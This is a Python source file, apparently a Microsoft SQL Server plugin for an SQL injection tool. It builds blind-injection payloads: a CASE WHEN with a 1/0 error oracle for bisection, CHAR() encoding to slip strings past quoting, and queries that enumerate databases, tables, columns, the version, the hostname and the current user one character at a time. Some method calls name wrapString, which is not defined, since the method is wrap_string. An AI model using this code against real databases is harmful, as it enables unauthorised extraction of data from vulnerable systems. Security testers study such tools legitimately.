#-*- coding:utf-8 -*-

from ..core.plugin import *
from ..core.forge import SQLForge

class MssqlForge(SQLForge):
	def __init__(self, context):
		SQLForge.__init__(self, context)
		
	"""
	Define overrides
	"""

	def wrap_bisec(self, cdt):
		return self.wrap_sql('SELECT CASE WHEN %s THEN %s ELSE 1/0 END' % (cdt,self.wrap_field('0')))

	def wrap_string(self, string):
		out = '('
		for car in string:
			out += 'CHAR(%d)+' % ord(car)
		out = out[:-1]+')'
		return out
	
	def string_len(self, string):
		return 'SELECT LEN(%s)' % string
	
		
	############################################
	# VERSION
	############################################

	def get_version(self):
		return '@@VERSION'

	def get_hostname(self):
		return 'HOST_NAME()'


	############################################
	# DATABASES
	############################################
	
	def get_current_database(self):
		return 'DB_NAME()'

	def get_databases(self):
		return 'SELECT name FROM master..sysdatabases'

	
	############################################
	# TABLES
	############################################
	
	def get_tables(self,db):
		return 'SELECT name FROM %s..sysobjects WHERE xtype= %s' % (db,self.wrapString('U'))
	
	def get_user(self):
		return 'user_name()'

	############################################
	# FIELDS
	############################################

	def getFields(self, table, db):
		return "SELECT name FROM %s..syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = %s)" % (db,self.wrapString(table))

	def get_string_len(self,str):
		return "LEN(%s)" % str

	def get_char(self,str,pos):
		return "ASCII(SUBSTRING(%s,%d,1))" % (str,pos+1)


@plugin('mssql','Microsoft SQL Server')
@allow(DBS_ENUM | TABLES_ENUM | COLS_ENUM | FIELDS_ENUM | COMMENT | STR)
class Mssql(Plugin):	
	def __init__(self, injector, limit_count_max=500):
		Plugin.__init__(self, MssqlForge, injector, limit_count_max)
